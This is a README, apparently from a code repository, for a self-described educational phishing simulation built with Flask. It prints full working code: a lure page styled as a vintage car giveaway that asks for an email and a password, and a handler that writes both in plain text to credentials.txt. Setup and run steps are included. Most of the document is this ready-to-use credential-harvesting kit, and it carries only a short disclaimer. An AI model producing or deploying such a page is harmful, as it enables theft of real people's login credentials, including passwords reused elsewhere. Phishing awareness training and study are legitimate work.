
# Phishing Website Simulation Project

## Overview 🐟
This project is a creative and educational phishing simulation aimed at demonstrating how phishing websites work in a controlled and safe environment. The goal is to educate users about phishing threats while showcasing a sample phishing website simulation. **This project is strictly for educational purposes.**

---

## Folder Structure 📂

Here is the directory structure for this project:

```
phishing_project
├── app.py
├── credentials.txt
├── static
│   ├── background.jpg
│   ├── vintage_car.jpg
│   └── styles.css
├── templates
│   ├── index.html
│   ├── about.html
│   ├── contact.html
│   └── thank_you.html
```

### File Descriptions:
1. **app.py**: Python file containing the Flask application logic.
2. **credentials.txt**: Stores credentials entered on the phishing page.
3. **static/**: Contains static assets such as CSS and images.
   - **background.jpg**: Background image for the web pages.
   - **vintage_car.jpg**: Image displayed in the container.
   - **styles.css**: Contains CSS styles for the website.
4. **templates/**: Contains all HTML files for the Flask app.
   - **index.html**: Landing page for the phishing site.
   - **about.html**: Information about the project.
   - **contact.html**: Contact page for the project.
   - **thank_you.html**: Thank-you page displayed after form submission.

---

## Screenshots 📸

### Folder Structure
![Folder Structure](./Folder%20structure%20.png)

### Landing Page
![Landing Page](./LandingPage.png)

### Thank-You Page
![Thank-You Page](./Thank_youPage.png)

### Credentials File
![Credentials File](./credentials.jpg)

---

## Scripts 📜

### app.py
```python
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/about')
def about():
    return render_template('about.html')

@app.route('/contact')
def contact():
    return render_template('contact.html')

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('username')
    password = request.form.get('password')
    with open('credentials.txt', 'a') as file:
        file.write(f"Email: {email}, Password: {password}\n")
    return render_template('thank_you.html')

if __name__ == '__main__':
    app.run(debug=True)
```

### styles.css
```css
/* General Reset */
body {
    margin: 0;
    padding: 0;
    font-family: 'Arial', sans-serif;
    background: url('/static/background.jpg') no-repeat center center fixed;
    background-size: cover;
    color: #333;
}

/* Container */
.container {
    max-width: 800px;
    margin: auto;
    padding: 20px;
    background: rgba(255, 255, 255, 0.9);
    border-radius: 10px;
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    text-align: center;
}

/* Header */
header {
    margin-bottom: 20px;
}

header h1 {
    color: #ff5733;
    font-size: 28px;
    text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.2);
}

header nav {
    margin-top: 10px;
}

header nav a {
    color: white;
    font-size: 20px;
    text-decoration: none;
    margin: 0 15px;
}

header nav a:hover {
    text-decoration: underline;
}

/* Decorative Image */
.decorative-image {
    max-width: 100%;
    height: auto;
    margin: 0 auto 20px;
    border-radius: 8px;
    display: block;
}

/* Main Content */
main p {
    font-size: 16px;
    line-height: 1.5;
}

main ul {
    text-align: left;
    padding-left: 20px;
    margin-bottom: 20px;
}

main ul li {
    font-size: 16px;
    margin-bottom: 10px;
    color: #333;
}

/* Form */
form .input-field {
    margin-bottom: 20px;
}

form input[type="text"],
form input[type="password"] {
    width: 90%;
    padding: 10px;
    margin-bottom: 10px;
    border: 1px solid #ddd;
    border-radius: 5px;
    font-size: 16px;
    box-sizing: border-box;
}

form button {
    background-color: #28a745;
    color: white;
    padding: 10px 20px;
    border: none;
    border-radius: 5px;
    font-size: 16px;
    cursor: pointer;
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
}

form button:hover {
    background-color: #218838;
}

/* Footer */
footer {
    margin-top: 20px;
    font-size: 14px;
    color: #555;
}

/* Error Messages */
.error-message {
    color: red;
    font-size: 12px;
    display: none;
}
```

### index.html
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vintage Car Giveaway</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>
<body>
    <div class="container">
        <header>
            <h1>🚗 Vintage Car Enthusiasts Giveaway 🚗</h1>
            <nav>
                <a href="{{ url_for('home') }}">Home</a>
                <a href="{{ url_for('about') }}">About Us</a>
                <a href="{{ url_for('contact') }}">Contact</a>
            </nav>
        </header>
        <main>
            <img src="{{ url_for('static', filename='vintage_car.jpg') }}" alt="Vintage Cars" class="decorative-image">
            <p>Welcome to the ultimate giveaway for vintage car lovers! Enter your details below for a chance to win:</p>
            <ul>
                <li>🔧 A Limited-Edition Mechanical Toolset</li>
                <li>🚙 A Vintage Car Miniature Model</li>
                <li>🛠️ A $100 Gift Card for Your Next Car Maintenance</li>
            </ul>
            <form action="/submit" method="POST">
                <div class="input-field">
                    <label for="username">Your Email:</label>
                    <input type="text" id="username" name="username" placeholder="Enter your email">
                </div>
                <div class="input-field">
                    <label for="password">Create a Password:</label>
                    <input type="password" id="password" name="password" placeholder="Enter a secure password">
                </div>
                <button type="submit">Join the Giveaway</button>
            </form>
        </main>
    </div>
</body>
</html>
```

... (Include `about.html`, `contact.html`, and `thank_you.html` similarly).

---

## How to Run 🖥️

1. **Set Up the Environment:**
    ```bash
    python3 -m venv myenv
    source myenv/bin/activate
    pip install flask
    ```
2. **Start the Server:**
    ```bash
    python app.py
    ```
3. **Access the Website:**
    Open `http://127.0.0.1:5000` in your browser.

---

## Disclaimer ⚠️
This project is for educational purposes only. Misuse of this project for malicious purposes is strictly prohibited.
